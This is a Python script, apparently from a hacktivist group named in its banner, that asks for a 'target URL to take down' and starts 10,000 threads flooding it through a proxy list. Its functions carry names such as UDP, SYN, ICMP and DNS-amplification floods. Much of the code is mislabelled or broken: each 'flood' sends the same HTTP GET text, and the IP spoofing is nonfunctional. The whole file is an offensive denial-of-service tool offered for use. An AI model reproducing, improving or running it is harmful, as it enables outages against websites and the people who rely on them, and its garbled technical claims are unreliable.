import socket
import threading
import random
import dns.resolver
import time

banner = """
\033[1;36m
 ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░  
                                         ░                  ░        ░         ░ ░                       ░            
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔        ║
║                        ║
║  We Are AnonCazzySoci 
║    •We don't die
     •We Multiply
║    
╚════════════════════════╝
\033[1;36m
"""

target_url = input("TARGET URL TO TAKE DOWN: ")
target_port = input("TARGET PORT: ")
botnet_size = 10000
fake_ip = '66.118.234.34:22'

proxy_list = []
with open("cazzy.txt", "r") as file:
    proxy_list = file.read().splitlines()

def get_ip_addresses(url):
    try:
        answers = dns.resolver.query(url, 'A')
        ip_addresses = [str(rdata) for rdata in answers]
        return ip_addresses
    except:
        return []

def generate_fake_ip():
    fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return fake_ip

def spoofer():
    addr = [192, 168, 0, 1]
    d = '4.240.112.191'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.sendto(message.encode('ascii'), (fake_ip, target_port))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | UDP flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.send(message.encode('ascii'))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SYN flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.send(message.encode('ascii'))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | HTTP flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.send(message.encode('ascii'))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | TCP flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.send(message.encode('ascii'))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SSL/TLS flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.send(message.encode('ascii'))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | ICMP flood sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((proxy_ip, int(proxy_port)))
        
        fake_ip = generate_fake_ip()
        message = "GET /" + target_ip + " HTTP/1.1\r\n"
        message += "Host: " + target_ip + "\r\n"
        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        message += "Accept-Language: en-US,en;q=0.9\r\n"
        message += "Accept-Encoding: gzip, deflate\r\n"
        message += "Connection: keep-alive\r\n"
        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
        
        packet_count = random.randint(10000, 20000)  
        
        for _ in range(packet_count):
            s.sendto(message.encode('ascii'), (fake_ip, target_port))
        
        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | DNS amplification attack sent (Increased speed and packet count)")
        
        s.close()
    except:
        pass

def ddos_attack():
    while True:
        try:
            target_ip = random.choice(get_ip_addresses(target_url))
            spoofed_ip = spoofer()
            proxy = random.choice(proxy_list)
            proxy_ip, proxy_port = proxy.split(":")
            
            attack_type = random.randint(1, 7)

            if attack_type == 1:
                udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            elif attack_type == 2:
                syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            elif attack_type == 3:
                http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            elif attack_type == 4:
                tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            elif attack_type == 5:
                ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            elif attack_type == 6:
                icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
            else:
                dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port)
            
            time.sleep(random.uniform(0.1, 0.5))  
        except:
            pass

def create_botnet():
    for _ in range(botnet_size):
        thread = threading.Thread(target=ddos_attack)
        thread.start()

def check_website(url):
    try:
        answers = dns.resolver.query(url, 'A')
        print("Valid URL")
        print("Loading...")
        time.sleep(5)
        print("Successfully launching the DDoS attack!")
        create_botnet()
        print("Botnet created!")
    except:
        print("Sorry, the website URL is not valid.")

check_website(target_url)
